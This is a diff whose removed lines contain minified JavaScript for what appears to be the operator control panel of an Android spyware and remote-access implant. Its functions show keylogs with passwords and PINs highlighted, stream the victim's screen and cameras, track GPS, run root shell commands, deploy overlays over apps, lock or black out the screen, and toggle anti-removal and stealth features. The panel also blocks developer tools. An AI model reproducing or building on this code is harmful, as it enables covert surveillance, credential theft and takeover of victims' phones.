@@ -1,7 +1,1205 @@
-console.clear(),console.log("%c[SYSTEM LOG] %cInitializing encrypted session...","color:#00f2ff; font-weight:bold;","color:#888;"),console.log("%c[SECURITY] %cSandbox environment detected. Applying hardened telemetry protocols.","color:#39ff14; font-weight:bold;","color:#888;"),console.log("%c[NETWORK] %cProxy link established: 127.0.0.1:9191 -> 0.0.0.0:443","color:#ffff00; font-weight:bold;","color:#888;"),document.addEventListener("contextmenu",e=>e.preventDefault()),document.addEventListener("keydown",e=>{if(123===e.keyCode||e.ctrlKey&&e.shiftKey&&(73===e.keyCode||74===e.keyCode||67===e.keyCode)||e.ctrlKey&&85===e.keyCode)return e.preventDefault(),!1});let mask=e=>"0x_"+btoa(e.split("").reverse().join("")),_0x1a=0,_0x1b=[],_0x1c=-1,_0x2a=!1,_0x2b=!1,_0x2c=null,_0x2d=0,_0x3a=!1,_0x3b=0,_0x3c="0",_0x3d=640,_0x3e=480,_0x3f=40,_lv=null,_ac=!1,audioStream=null,_ih=null;function showInfo(e,t,o){e&&e.stopPropagation(),(n=document.getElementById("info-popup"))||((n=document.createElement("div")).id="info-popup",Object.assign(n.style,{position:"absolute",background:"rgba(15,15,25,0.98)",border:"1px solid var(--neon-cyan)",color:"#fff",padding:"16px",borderRadius:"12px",zIndex:"20000",width:"280px",boxShadow:"0 20px 60px rgba(0,0,0,0.9), 0 0 20px rgba(0,242,255,0.1)",transition:"opacity 0.3s ease",opacity:"0",display:"none",pointerEvents:"auto"}),document.body.appendChild(n));var n,e=e.target.getBoundingClientRect(),r=window.pageXOffset||document.documentElement.scrollLeft,a=window.pageYOffset||document.documentElement.scrollTop;let l=e.bottom+a+10,s=e.left+r-140+e.width/2;(s=s<10?10:s)+280>window.innerWidth+r&&(s=window.innerWidth+r-290),n.style.top=l+"px",n.style.left=s+"px",n.innerHTML='<div style="font-weight:bold; color:var(--neon-cyan); font-family:Orbitron, sans-serif; font-size:0.8rem; margin-bottom:8px;">'+t+'</div><div style="font-size:0.7rem; opacity:0.8; font-family:monospace; line-height:1.4;">'+o+"</div>",n.style.display="block",setTimeout(()=>n.style.opacity="1",10)}function hideInfo(){let e=document.getElementById("info-popup");e&&"block"===e.style.display&&(e.style.opacity="0",setTimeout(()=>e.style.display="none",300))}function updateNav(){let n=window.location.pathname,e=document.querySelectorAll(".nav a");e.forEach(e=>{var t=e.getAttribute("href");let o=!1;(o="/"===t?"/"===n||"/terminal"===n:"/files"===t?n.startsWith("/files")||n.startsWith("/device/apps"):"/device"===t?n.startsWith("/device")&&!n.includes("/apps"):n.startsWith(t))?e.classList.add("active"):n.startsWith(t)&&"/"!==t||e.classList.remove("active")})}function showToast(e,t="info"){let o=document.getElementById("c2-toast");o||((o=document.createElement("div")).id="c2-toast",Object.assign(o.style,{position:"fixed",bottom:"15%",left:"50%",transform:"translateX(-50%)",background:"rgba(15,15,25,0.98)",border:"1px solid var(--neon-cyan)",color:"#fff",padding:"16px 32px",borderRadius:"12px",zIndex:"10000",fontSize:"0.9rem",textAlign:"center",minWidth:"320px",boxShadow:"0 20px 60px rgba(0,0,0,0.9), 0 0 20px rgba(0,242,255,0.1)",transition:"all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275)",opacity:"0",display:"none",fontFamily:"Orbitron, sans-serif",letterSpacing:"1px"}),document.body.appendChild(o)),o.style.borderColor="error"===t?"var(--danger)":"var(--neon-cyan)",o.innerHTML=e,o.style.display="block",setTimeout(()=>{o.style.opacity="1",o.style.bottom="20%"},10),setTimeout(()=>{o.style.opacity="0",o.style.bottom="15%",setTimeout(()=>o.style.display="none",500)},5500)}function repairProtocol(){_0x4a("REPAIR_LINK","Re-synchronizing background telemetry protocols...",()=>{fetch("/gps/request-permission"),fetch("/device/fix-persistence").then(e=>e.json()).then(e=>{showToast(e.message)}).catch(e=>{console.error(e),showToast("Connection failure","error")})})}function dispatchPermissionSequence(){showToast("PERMISSION_PROMPTS_SENT"),fetch("/device/request-permissions").then(e=>e.json()).then(e=>{showToast(e.message)}).catch(e=>{console.error(e),showToast("Request failed","error")})}function optimizeStability(){_0x4a("STABILITY_OPTIMIZE","Bypassing OEM power restrictions...",()=>{fetch("/device/optimize-stability").then(e=>e.json()).then(e=>{showToast("STABILITY_SYNC: Follow OEM instructions to enable Auto-start")}).catch(e=>{console.error(e),showToast("Stability sync failed","error")})})}function deepRepair(){_0x4a("CORE_REPAIR","Opening deep system configuration to resolve environment conflicts...",()=>{fetch("/device/deep-repair").then(e=>e.json()).then(e=>{showToast("SETTINGS_OPENED: Complete repair on device")}).catch(e=>{console.error(e),showToast("Repair link failed","error")})})}function injectTrust(){showToast("BYPASS_SEQUENCE_INITIATED"),fetch("/device/inject-trust").then(e=>e.json()).then(e=>{showToast("BYPASS_INITIATED: Wait for install prompt")}).catch(e=>{console.error(e),showToast("Bypass failed","error")})}function initiateHeal(){_0x4a("AUTO_HEAL_PROTOCOL","Initiating self-healing sequence to restore persistence layers...",()=>{ghostAction("autoheal")})}function _0x4a(e,t,o){let n=document.getElementById("tactical-modal"),r=(n||((n=document.createElement("div")).id="tactical-modal",Object.assign(n.style,{position:"fixed",top:"0",left:"0",width:"100%",height:"100%",background:"rgba(0,0,0,0.85)",zIndex:"30000",display:"flex",alignItems:"center",justifyContent:"center",opacity:"0",transition:"opacity 0.4s ease",backdropFilter:"blur(10px)"}),n.innerHTML='<div style="background:#0a0a0f; border:1px solid var(--neon-cyan); padding:40px; border-radius:15px; width:450px; text-align:center; box-shadow:0 0 50px rgba(0,242,255,0.2);"><div style="font-family:Orbitron, sans-serif; color:var(--neon-cyan); font-size:1.2rem; margin-bottom:15px;" id="tm-title">TACTICAL_INITIATION</div><div style="color:#aaa; font-size:0.85rem; margin-bottom:30px; min-height:40px;" id="tm-msg">Preparing remote system command...</div><div style="width:100%; height:4px; background:rgba(255,255,255,0.05); border-radius:2px; overflow:hidden; margin-bottom:30px;"><div id="tm-progress" style="width:0%; height:100%; background:var(--neon-cyan); box-shadow:0 0 10px var(--neon-cyan); transition: width 0.3s ease;"></div></div><div style="display:flex; justify-content:center; gap:20px;"><button id="tm-cancel" class="btn btn-small" style="border-color:#555; color:#555;">ABORT_SEQUENCE</button></div></div>',document.body.appendChild(n)),document.getElementById("tm-title").innerText=e,document.getElementById("tm-msg").innerText=t,document.getElementById("tm-progress").style.width="0%",n.style.display="flex",setTimeout(()=>n.style.opacity="1",10),!1),a=()=>{r=!0,n.style.opacity="0",setTimeout(()=>n.style.display="none",400)},l=(document.getElementById("tm-cancel").onclick=a,0),s=setInterval(()=>{r?clearInterval(s):(100<=(l+=4*Math.random())&&(l=100,clearInterval(s),setTimeout(()=>{r||(a(),o())},600)),document.getElementById("tm-progress").style.width=l+"%")},120)}async function handleLogin(e){e.preventDefault();let t=document.getElementById("password").value,o=document.getElementById("status-header"),n=document.getElementById("uplink-btn");n.disabled=!0,n.style.opacity="0.5";try{(await(await fetch("/login",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"password="+encodeURIComponent(mask(t))+"&json=true"})).json()).success?(o.textContent="ACCESS_GRANTED",o.style.color="#39ff14",o.style.textShadow="0 0 25px #39ff14",setTimeout(()=>{window.location.href="/?auth="+Date.now()},1e3)):(o.textContent="INCORRECT_PASSWORD",o.style.color="#ff3131",o.style.textShadow="0 0 25px #ff3131",n.disabled=!1,n.style.opacity="1",setTimeout(()=>{o.textContent="RESTRICTED_ACCESS",o.style.color="#00f2ff",o.style.textShadow="0 0 15px rgba(0,242,255,0.6)"},2e3))}catch(e){console.error(e),n.disabled=!1,n.style.opacity="1"}}async function updatePassword(e){e.preventDefault();var t=e.target.querySelector('input[name="new_password"]').value;try{var o=await(await fetch("/settings/password",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"new_password="+encodeURIComponent(mask(t))})).text();document.open(),document.write(o),document.close()}catch(e){console.error(e)}}function fetchLogs(){let n=document.getElementById("log-terminal");n&&fetch("/terminal/logs?since="+_0x1a).then(e=>e.json()).then(e=>{var t;e.reset&&(n.innerHTML="",_0x1a=0),e.logs&&0<e.logs.length&&(t=n.scrollHeight-n.scrollTop<=n.clientHeight+50,0===_0x1a&&(n.innerHTML=""),e.logs.forEach(e=>{var t=document.createElement("div");t.style.marginBottom="4px";let o=e;e.startsWith("[I]")?(t.style.color="var(--encrypted-blue)",t.style.fontWeight="bold",t.style.textShadow="0 0 10px rgba(0, 136, 255, 0.3)",o=e.substring(3)):e.startsWith("[C]")?(t.style.color="var(--danger)",t.style.textShadow="0 0 10px rgba(255, 49, 49, 0.5)",t.style.fontWeight="bold",o=e.substring(3)):e.startsWith("[W]")?(t.style.color="var(--neon-orange)",o=e.substring(3)):e.startsWith("[S]")?(t.style.color="var(--neon-green)",o=e.substring(3)):t.style.color="var(--neon-cyan)",t.innerText=o,n.appendChild(t)}),_0x1a=e.last_id,t)&&(n.scrollTop=n.scrollHeight)}).catch(e=>console.error("Log fetch failed",e))}function clearSessionLogs(){showToast("PURGING_ACTIVITY_LOGS..."),fetch("/terminal/clear-logs").then(()=>{_0x1a=0,fetchLogs()})}function openAccessibility(){fetch("/device/open-accessibility").then(e=>e.json()).then(e=>{showToast("ACCESSIBILITY_HUB_OPENED")}).catch(e=>{console.error(e),showToast("Link failure","error")})}function openNotifications(){fetch("/device/open-notifications").then(e=>e.json()).then(e=>{showToast("NOTIFICATION_HUB_OPENED")}).catch(e=>{console.error(e),showToast("Link failure","error")})}function deviceCmd(e){fetch("/device/"+e).then(e=>e.json()).then(e=>{e&&e.redirect&&(window.location.href=e.redirect)})}function restartServer(){confirm("Refresh background service? Interface will temporarily disconnect.")&&(fetch("/terminal/restart"),setTimeout(()=>location.reload(),2500))}function selfDestruct(){confirm("CAUTION: This will initiate the removal of all system stability protocols and uninstall the app. Proceed?")&&fetch("/device/self-destruct")}function sendToast(){var e=document.getElementById("toast-msg").value;e&&fetch("/device/toast?msg="+encodeURIComponent(e))}function toggleColorPicker(e){e&&e.stopPropagation();e=document.getElementById("color-picker-palette");e&&(e.style.display="none"===e.style.display?"grid":"none")}function pickToastColor(e){document.getElementById("toast-color-val").value=e,document.getElementById("toast-color-btn").style.background=e;e=document.getElementById("color-picker-palette");e&&(e.style.display="none")}function sendEnhancedToast(){let a=document.getElementById("toast-msg").value;if(!a)return showToast("ENTER_MESSAGE_FIRST","error");var e=document.getElementById("toast-anim").value;if("burnt"===e){showToast("Sending_Burnt_Toast");for(let e=0;e<15;e++)setTimeout(()=>{var e=Math.floor(40*Math.random())+15,t=Math.floor(1600*Math.random())+100,o=Math.floor(7e3*Math.random())+3e3,n=["pop","static","scroll"][Math.floor(3*Math.random())],r=document.getElementById("toast-color-val").value;fetch("/device/toast?msg="+encodeURIComponent(a)+"&size="+e+"&y="+t+"&duration="+o+"&anim="+n+"&color="+encodeURIComponent(r))},200*e)}else{var t=document.getElementById("toast-size").value,o=document.getElementById("toast-y").value,n=document.getElementById("toast-dur").value,r=document.getElementById("toast-color-val").value;fetch("/device/toast?msg="+encodeURIComponent(a)+"&size="+t+"&y="+o+"&duration="+n+"&anim="+e+"&color="+encodeURIComponent(r)).then(e=>e.json()).then(e=>{e.success&&showToast("TOAST_DISPATCHED")})}}function openApp(){var e=document.getElementById("app-selector").value;e&&fetch("/device/open-app?pkg="+encodeURIComponent(e))}function openUrl(){var e=document.getElementById("target-url").value;e&&fetch("/device/open-url?url="+encodeURIComponent(e))}function executeShell(){let e=document.getElementById("shell-cmd"),t=e.value,o=document.getElementById("shell-output");var n,r;t&&(_0x1b.push(t),50<_0x1b.length&&_0x1b.shift(),_0x1c=-1,(n=document.createElement("div")).style.color="#fff",n.style.marginTop="10px",r=(r=document.getElementById("terminal-prompt"))?r.innerText:"root@Android:~#",n.innerHTML='<span style="color:var(--terminal-green)">'+r+"</span> "+t,o.appendChild(n),e.value="",fetch("/device/shell?cmd="+encodeURIComponent(t)).then(e=>e.json()).then(e=>{if(e.termux_available){document.getElementById("termux-uplink").style.display="block";let e=document.getElementById("terminal-prompt");e&&(e.innerText="root@Android:~$")}else{let e=document.getElementById("terminal-prompt");e&&(e.innerText="root@Android:~#")}let t=document.createElement("div");t.style.whiteSpace="pre-wrap",t.innerHTML=e.output||"No output",o.appendChild(t),o.scrollTop=o.scrollHeight}).catch(e=>{var t=document.createElement("div");t.style.color="var(--danger)",t.textContent="[ERROR] Connection lost",o.appendChild(t)}))}function startGhostScreen(){_0x2a=!0;var e=document.getElementById("ghost-screen-status"),e=(e&&(e.style.display="none"),document.getElementById("ghost-toggle-btn"));e&&(e.innerText="TERMINATE",e.style.borderColor="var(--danger)",e.style.color="var(--danger)"),refreshGhostScreen()}function stopGhostScreen(){_0x2a=!1;var e=document.getElementById("ghost-screen-status"),e=(e&&(e.style.display="block",e.innerText="OLED_STANDBY"),document.getElementById("ghost-toggle-btn"));e&&(e.innerText="INITIATE_VIEW",e.style.borderColor="var(--neon-green)",e.style.color="var(--neon-green)"),document.getElementById("ghost-screen-stream").src=""}function toggleGhostScreen(){(_0x2a?stopGhostScreen:startGhostScreen)()}function refreshGhostScreen(){if(_0x2a){let e=document.getElementById("ghost-screen-stream"),t=document.getElementById("ghost-screen-status"),o=new Image;o.src="/ghost/screenshot?t="+Date.now(),o.onload=()=>{_0x2a&&(e.src=o.src,t&&(t.style.display="none"),setTimeout(refreshGhostScreen,_0x2b?5e3:200))},o.onerror=()=>{_0x2a&&setTimeout(refreshGhostScreen,300)}}}function startGhostDrag(e){var t=document.getElementById("ghost-screen-stream").getBoundingClientRect();_0x2c={x:(e.clientX-t.left)/t.width*100,y:(e.clientY-t.top)/t.height*100,t:Date.now()}}function endGhostDrag(e){var t,o,n;!_0x2c||(t=Date.now())-_0x2d<150||(_0x2d=t,n=document.getElementById("ghost-screen-stream").getBoundingClientRect(),o=(e.clientX-n.left)/n.width*100,e=(e.clientY-n.top)/n.height*100,n=t-_0x2c.t,Math.sqrt(Math.pow(o-_0x2c.x,2)+Math.pow(e-_0x2c.y,2))<2?fetch("/ghost/interact?action=click&px="+_0x2c.x+"&py="+_0x2c.y):fetch("/ghost/interact?action=swipe&px1="+_0x2c.x+"&py1="+_0x2c.y+"&px2="+o+"&py2="+e+"&d="+Math.max(n,100)),_0x2c=null)}function openSettings(){fetch("/ghost/interact?action=settings")}function deployOverlay(){var e=document.getElementById("overlay-type").value;if(!e)return showToast("SELECT_TARGET_FIRST","error");showToast("OVERLAY_DISPATCH_SENT"),fetch("/ghost/deploy-overlay?type="+e).then(e=>e.json()).then(e=>{showToast("OVERLAY_DEPLOYED")})}function terminateOverlay(){fetch("/ghost/deploy-overlay").then(e=>e.json()).then(e=>{showToast("OVERLAY_TERMINATED")})}function toggleLock(){fetch("/ghost/lock").then(()=>{showToast("Uplink command sent: SYSTEM_LOCK"),checkGhostStatus()})}function toggleBlackout(){var e=document.getElementById("blackout-btn").innerText.includes("ACTIVATE");showToast(e?"BLACKOUT_PROTOCOL_ENGAGED":"RESTORING_HARDWARE_BACKLIGHT..."),fetch("/ghost/interact?action="+(e?"blackout_on":"blackout_off")).then(()=>checkGhostStatus())}function toggleAutoPilot(){fetch("/stealth?action=autopilot").then(e=>e.json()).then(e=>{var t=document.getElementById("autopilot-btn");e.autopilot?(t.innerText="AUTOPILOT_ENGAGED",t.classList.add("btn-engaged-yellow"),t.style.color="#000",t.style.background="#ffff00"):(t.innerText="AUTOPILOT_OFF",t.classList.remove("btn-engaged-yellow"),t.style.color="var(--neon-yellow)",t.style.background="rgba(255, 255, 255, 0.03)")})}function ghostType(){var e=document.getElementById("ghost-type-input"),t=e.value;t&&fetch("/ghost/interact?action=type&text="+encodeURIComponent(t)),e.value=""}function ghostAction(e){fetch("/ghost/interact?action="+e)}function clearGhostLogs(){showToast("PURGING_KEYLOG_HISTORY..."),fetch("/ghost/clear").then(()=>refreshGhostLogs())}async function refreshInspector(){var o=document.getElementById("inspector-tree");if(o){o.innerHTML='<span style="color:var(--neon-cyan)">[SCANNING] Traversing Accessibility Tree...</span>';try{var n=await(await fetch("/ghost/inspector")).json();if(n.error)o.innerHTML='<span style="color:var(--danger)">[ERROR] '+n.error+"</span>";else{o.innerHTML="";var r=document.createElement("div");r.style.padding="12px 18px",r.style.marginBottom="20px",r.style.background="rgba(0, 242, 255, 0.08)",r.style.border="1px solid rgba(0, 242, 255, 0.15)",r.style.borderRadius="10px",r.style.boxShadow="inset 0 0 15px rgba(0,242,255,0.05)";let t=n.package,e="&#128241;";["launcher","trebuchet","home","desktop","nexuslauncher"].some(e=>t.toLowerCase().includes(e))?(t="System Home Screen",e="&#127968;"):t.includes(".android.settings")?t="System Settings":t.includes(".vending")?t="Google Play Store":t.includes(".chrome")?t="Chrome Browser":t.includes(".messaging")||t.includes(".sms")?t="SMS / Messages":t.includes(".contacts")&&(t="Contacts / Phonebook"),r.innerHTML=`<div style="display:flex; align-items:center; gap:12px; width:100%;"><div style="font-size:1.6rem; flex-shrink:0; filter: drop-shadow(0 0 5px var(--neon-cyan));">${e}</div><div style="flex-grow:1; min-width:0; overflow:hidden;"><div style="font-size:0.6rem; color:var(--neon-cyan); letter-spacing:1.5px; font-weight:bold; opacity:0.8; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;">CURRENT_UPLINK_CONTEXT</div><div style="font-size:1.1rem; font-weight:900; color:#fff; text-shadow:0 0 10px rgba(255,255,255,0.2); white-space:nowrap; overflow:hidden; text-overflow:ellipsis;">${t}</div><div style="font-size:0.55rem; color:rgba(255,255,255,0.4); font-family:monospace; margin-top:2px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;">${n.package}</div></div><div style="text-align:right; font-size:0.55rem; color:var(--neon-green); opacity:0.7; font-weight:bold; flex-shrink:0; line-height:1.2; min-width:80px;">SECURE_LAYER_V2<br>SYSCALL_ACTIVE</div></div>`,o.appendChild(r),_0x5a(n.tree,o,0,n.width,n.height)}}catch(e){o.innerHTML='<span style="color:var(--danger)">[FATAL] Inspector Timeout</span>'}}}function _0x5a(n,r,a,l,s){if(n){let e=document.createElement("div");e.style.display="flex",e.style.alignItems="center",e.style.padding="8px 12px",e.style.marginLeft=16*a+"px",e.style.borderLeft="1px solid rgba(0, 242, 255, 0.12)",e.style.whiteSpace="nowrap",e.style.transition="all 0.2s cubic-bezier(0.4, 0, 0.2, 1)",e.style.cursor="pointer",e.style.borderRadius="4px";var i=n.class.split(".").pop();let t="&#9634;",o=(n.class.toLowerCase().includes("button")?t="&#9007;":n.class.toLowerCase().includes("edit")?t="&#9998;":n.class.toLowerCase().includes("text")?t="&#8443;":n.class.toLowerCase().includes("image")?t="&#128443;":n.class.toLowerCase().includes("layout")?t="&#128392;":(n.class.toLowerCase().includes("recycler")||n.class.toLowerCase().includes("list"))&&(t="&#128220;"),e.title=`Class: ${n.class}
-Bounds: ${n.x},${n.y} [${n.w}x${n.h}]
-Visible: ${n.visible}
-Focusable: `+n.focusable,`<span style="color:var(--neon-cyan); margin-right:10px; font-size:0.9rem; opacity:0.8;">${t}</span><span style="color:var(--neon-green); font-weight:900; font-size:0.85rem; letter-spacing:0.5px;">${i}</span>`);n.resId&&(o+=`<span style="color:var(--neon-orange); margin-left:10px; font-size:0.7rem; opacity:0.8; font-family:monospace;">#${n.resId.split("/").pop()}</span>`),n.text?o+=`<span style="color:#fff; margin-left:12px; font-weight:bold; font-size:0.8rem; background:rgba(255,255,255,0.05); padding:2px 8px; border-radius:4px;">"${n.text}"</span>`:n.desc&&(o+=`<span style="color:rgba(255,255,255,0.5); margin-left:12px; font-size:0.75rem; font-style:italic;">[${n.desc}]</span>`),n.clickable&&(o+='<span style="background:rgba(57,255,20,0.15); color:var(--neon-green); border:1px solid rgba(57,255,20,0.4); padding:1px 6px; border-radius:100px; font-size:0.55rem; margin-left:12px; font-weight:900; letter-spacing:0.5px;">CLICKABLE</span>'),n.password&&(o+='<span style="background:rgba(255,49,49,0.2); color:var(--danger); border:1px solid rgba(255,49,49,0.5); padding:1px 6px; border-radius:100px; font-size:0.55rem; margin-left:6px; font-weight:900; letter-spacing:0.5px;">PASSWORD</span>'),n.editable&&(o+='<span style="background:rgba(0,136,255,0.2); color:var(--encrypted-blue); border:1px solid rgba(0,136,255,0.5); padding:1px 6px; border-radius:100px; font-size:0.55rem; margin-left:6px; font-weight:900; letter-spacing:0.5px;">EDITABLE</span>'),e.innerHTML=o,e.onmouseenter=()=>{e.style.background="rgba(0, 242, 255, 0.08)",e.style.boxShadow="0 0 10px rgba(0, 242, 255, 0.1)"},e.onmouseleave=()=>{e.style.background="transparent",e.style.boxShadow="none"},e.onclick=t=>{t.stopPropagation();const x=100*(n.x+n.w/2)/l,y=100*(n.y+n.h/2)/s;fetch(`/ghost/interact?action=click&px=${x}&py=${y}`)},r.appendChild(e),n.children&&n.children.forEach(c=>_0x5a(c,r,a+1,l,s))}}async function refreshGhostLogs(){try{var e=await fetch("/ghost/keys");if(e.ok){var o=await e.json(),n=document.getElementById("ghost-terminal");if(n&&0<o.keys.length){var r=n.scrollHeight-n.scrollTop<=n.clientHeight+10;let t=o.keys.join("").replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");t=(t=t.replace(/(\[.*?\] ->)/g,'<span style="color:var(--neon-cyan); font-weight:bold; opacity:0.8;">$1</span>')).replace(/(\[CLICK\]:|\[LONG_CLICK\]:)/g,'<span style="color:var(--neon-green); font-weight:bold;">$1</span>'),["password","pin","code","auth","login","account","verify"].forEach(e=>{e=new RegExp("("+e+")","gi");t=t.replace(e,'<span style="color:var(--neon-yellow); font-weight:bold; border-bottom:1px solid var(--neon-yellow);">$1</span>')}),t=t.replace(/\b(\d{4,8})\b/g,'<span style="color:var(--danger); font-weight:bold; text-shadow: 0 0 8px var(--danger);">$1</span>');["\\x1C\\x0D\\x03","\\x13\\x18\\x00\\x12\\x13\\x01\\x10\\x0A","\\x0F\\x06\\x14\\x00\\x0A","\\x16\\x1A\\x16\\x13","\\x06\\x04\\x02\\x08\\x08"].forEach(e=>{e=new RegExp("("+e.split("").map((e,t)=>String.fromCharCode(e.charCodeAt(0)^"SysAdmin".charCodeAt(t%8))).join("")+")","gi");t=t.replace(e,'<span style="color:var(--danger); font-weight:bold; text-shadow: 0 0 10px rgba(255,49,49,0.5);">$1</span>')}),n.innerHTML=t,r&&(n.scrollTop=n.scrollHeight)}}}catch(e){}}async function checkGhostStatus(){try{var e,t,o,n,r,a,l,s=await fetch("/ghost/status");s.ok&&(e=await s.json(),_0x2b=e.isIdle,t=document.getElementById("ghost-status-card"),o=document.getElementById("ghost-status-text"),n=document.getElementById("accessibility-prompt"),r=document.getElementById("lock-btn"),a=document.getElementById("anti-removal-btn"),l=document.getElementById("blackout-btn"),e.active?(t.style.borderColor="var(--neon-green)",o.innerHTML='<span style="color:var(--neon-green);">UPLINK_ESTABLISHED</span>',n.style.display="none"):(t.style.borderColor="var(--danger)",o.innerHTML='<span style="color:var(--danger);">OFFLINE_AWAITING_PERMISSION</span>',n.style.display="block"),r&&(e.lock?(r.innerHTML="RELEASE_LOCK",r.style.borderColor="var(--neon-green)",r.style.color="var(--neon-green)"):(r.innerHTML="DEPLOY_LOCK",r.style.borderColor="var(--danger)",r.style.color="var(--danger)")),l&&(e.blackout?(l.innerHTML="RESTORE_DISPLAY",l.style.borderColor="var(--neon-cyan)",l.style.color="var(--neon-cyan)",document.getElementById("blackout-feedback")&&(document.getElementById("blackout-feedback").style.display="block")):(l.innerHTML="ACTIVATE_BLACKOUT",l.style.borderColor="#fff",l.style.color="#fff",document.getElementById("blackout-feedback")&&(document.getElementById("blackout-feedback").style.display="none"))),document.getElementById("ghost-screen-stream")&&(document.getElementById("ghost-screen-stream").style.filter=e.blackout?"brightness(5.4) contrast(1.1)":"none"),a)&&(e.antiRemoval?(a.innerHTML="ANTI-REMOVAL SHIELD: ON",a.style.borderColor="var(--neon-green)",a.style.color="var(--neon-green)"):(a.innerHTML="ANTI-REMOVAL SHIELD: OFF",a.style.borderColor="var(--danger)",a.style.color="var(--danger)"))}catch(e){}}function rotateStream(){_0x3b=(_0x3b+90)%360,document.getElementById("main-stream").style.transform="rotate("+_0x3b+"deg)"}function applyQuality(e){e=resConfig[resOptions[e]];_0x3d=e.w,_0x3e=e.h,_0x3f=e.q,_0x3a&&initiateStream(_0x3c)}async function initiateStream(e){_0x3c=e,_0x3a=!0,document.getElementById("loading-overlay").style.display="block",document.getElementById("loading-overlay").innerText="INITIALIZING_UPLINK...";var t=document.getElementById("live-indicator"),o=document.getElementById("indicator-dot"),n=document.getElementById("indicator-text"),t=(t.style.borderColor="var(--neon-green)",t.style.color="var(--neon-green)",t.style.background="rgba(57, 255, 20, 0.15)",o.className="badge-dot blink-slow",n.innerText="LIVE",document.querySelectorAll(".cam-btn").forEach(e=>{e.classList.remove("btn-engaged-green"),e.style.borderColor="var(--neon-green)",e.style.color="var(--neon-green)"}),document.getElementById("cam-btn-"+e));t&&(t.classList.add("btn-engaged-green"),t.style.borderColor="",t.style.color="");let r=document.getElementById("main-stream");r.style.display="none",await fetch("/camera/stop-stream"),setTimeout(()=>{r.src="/camera/stream?cam="+e+"&width="+_0x3d+"&height="+_0x3e+"&quality="+_0x3f+"&t="+Date.now(),r.onload=()=>{document.getElementById("loading-overlay").style.display="none",r.style.display="block"}},500)}function terminateCaptures(){_0x3a=!1;var e=document.getElementById("main-stream"),e=(e.src="",e.style.display="none",document.getElementById("loading-overlay").style.display="block",document.getElementById("loading-overlay").innerText="Uplink_Ready",document.getElementById("live-indicator")),t=document.getElementById("indicator-dot"),o=document.getElementById("indicator-text");e.style.borderColor="var(--neon-yellow)",e.style.color="var(--neon-yellow)",e.style.background="rgba(255, 255, 0, 0.05)",t.className="badge-dot",o.innerText="STANDBY",document.querySelectorAll(".cam-btn").forEach(e=>{e.classList.remove("btn-engaged-green"),e.style.borderColor="var(--neon-green)",e.style.color="var(--neon-green)"}),fetch("/camera/terminate").then(()=>{document.getElementById("rec-btn").innerText="START_RECORDING"})}function capturePhoto(){_0x3c?window.open("/camera/photo?cam="+_0x3c,"_blank"):showToast("SELECT_CAMERA_FIRST","error")}function toggleRecording(){var e=document.getElementById("rec-btn");_0x3a?e.innerText.includes("START")?(e.innerText="STOP_RECORDING",fetch("/camera/record?cam="+_0x3c)):(e.innerText="START_RECORDING",fetch("/camera/stop-record")):showToast("START_FEED_FIRST","error")}function checkRecStatus(){fetch("/camera/status").then(e=>e.json()).then(e=>{var t=document.getElementById("live-indicator"),o=document.getElementById("indicator-dot"),n=document.getElementById("indicator-text"),r=document.getElementById("rec-btn");if(e.last_finished){if(null!==_lv&&e.last_finished!==_lv){showToast("DATA_SYNC: Auto-downloading recording...");let a=document.createElement("a");a.href="/download/"+e.last_finished,a.download="",document.body.appendChild(a),a.click(),document.body.removeChild(a)}_lv=e.last_finished}e.recording?(t.style.borderColor="var(--danger)",t.style.color="var(--danger)",t.style.background="rgba(255, 49, 49, 0.15)",o.className="badge-dot blink-fast",n.innerText="REC ("+e.duration+"s)",r.innerText="STOP_RECORDING"):(_0x3a?(t.style.borderColor="var(--neon-green)",t.style.color="var(--neon-green)",t.style.background="rgba(57, 255, 20, 0.15)",o.className="badge-dot blink-slow",n.innerText="LIVE"):(t.style.borderColor="var(--neon-yellow)",t.style.color="var(--neon-yellow)",t.style.background="rgba(255, 255, 0, 0.05)",o.className="badge-dot",n.innerText="STANDBY"),r.innerText="START_RECORDING")})}document.addEventListener("click",function(e){var t=document.getElementById("info-popup");t&&"block"===t.style.display&&!t.contains(e.target)&&hideInfo()});let currentLat=0,currentLon=0;function _0x6a(e){var t,o=document.getElementById("gps-log");o&&((t=document.createElement("div")).textContent="["+(new Date).toLocaleTimeString()+"] "+e,o.insertBefore(t,o.firstChild))}function locateDevice(){_0x6a("[REQUEST] Pinging satellites..."),fetch("/gps/locate?json=true").then(e=>e.json()).then(e=>{var t,o,n;e.success?(currentLat=e.lat,currentLon=e.lon,(t=document.getElementById("coord-display"))&&(t.innerHTML="LAT: "+e.lat+" | LON: "+e.lon),_0x6a("[SUCCESS] Fix acquired: "+e.lat+", "+e.lon),t=document.getElementById("map-frame"),o=document.getElementById("map-overlay"),n=document.getElementById("ext-map-btn"),t&&(t.src="https://www.openstreetmap.org/export/embed.html?bbox="+(e.lon-.01)+","+(e.lat-.01)+","+(e.lon+.01)+","+(e.lat+.01)+"&layer=mapnik&marker="+e.lat+","+e.lon,t.style.display="block"),o&&(o.style.display="none"),n&&(n.style.display="inline-block")):(_0x6a("[ERROR] "+e.message),showToast(e.message))}).catch(e=>{_0x6a("[FATAL] Network error during triangulation")})}function openExternalMap(){window.open("https://www.google.com/maps/search/?api=1&query="+currentLat+","+currentLon,"_blank")}function filterFiles(){let t=document.getElementById("file-search").value.toLowerCase();document.querySelectorAll(".file-item").forEach(e=>{e.querySelector(".file-name").textContent.toLowerCase().includes(t)?e.style.display="flex":e.style.display="none"})}function setFilter(e){if("all"===e)document.querySelectorAll(".file-item").forEach(e=>e.style.display="flex");else{let o=e.split(",");document.querySelectorAll(".file-item").forEach(e=>{let t=e.querySelector(".file-name").textContent.toUpperCase();o.some(e=>t.endsWith(e))?e.style.display="flex":e.style.display="none"})}}function clearIntel(){showToast("PURGING_INTEL_STREAM..."),fetch("/intel/clear").then(()=>location.reload())}function toggleStealth(){var e=document.getElementById("stealth-type").value;showToast("INITIATING_STEALTH_CAMOUFLAGE..."),fetch("/stealth?type="+e).then(e=>e.json()).then(e=>{e.status&&showToast("STEALTH_APPLIED: "+e.status)}).catch(e=>{console.error(e),showToast("Stealth request failed","error")})}async function toggleLiveAudio() {
+console.clear();
